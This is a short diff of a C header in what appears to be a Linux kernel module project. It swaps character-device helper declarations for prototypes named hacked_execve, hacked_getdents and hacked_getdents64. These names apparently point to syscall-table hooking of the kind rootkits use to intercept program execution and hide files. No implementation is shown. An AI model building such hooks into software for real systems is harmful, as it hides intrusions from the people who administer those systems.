@@ -16,15 +16,16 @@
  * along with this program.  If not, see <http://www.gnu.org/licenses/>.
  */
 
-#ifndef _CROCODILE_LKM_DEVICE_DEVICE_UTILS_H_
-#define _CROCODILE_LKM_DEVICE_DEVICE_UTILS_H_
+#ifndef _CROCODILE_LKM_SYSTBL_HACKED_FUNCS_H_
+#define _CROCODILE_LKM_SYSTBL_HACKED_FUNCS_H_
 
 #include "types.h"
 
-void cdev_setup(module_dev_t* p_dev, int major, int minor, int idx, 
-                struct file_operations* p_fops);
+asmlinkage long hacked_execve(const struct pt_regs* p_regs);
 
-int cdev_trim(module_dev_t* p_dev);
+asmlinkage long hacked_getdents(const struct pt_regs* p_regs);
 
-#endif /* _CROCODILE_LKM_DEVICE_DEVICE_UTILS_H_ */
+asmlinkage long hacked_getdents64(const struct pt_regs* p_regs);
+
+#endif /* _CROCODILE_LKM_SYSTBL_HACKED_FUNCS_H_ */
 
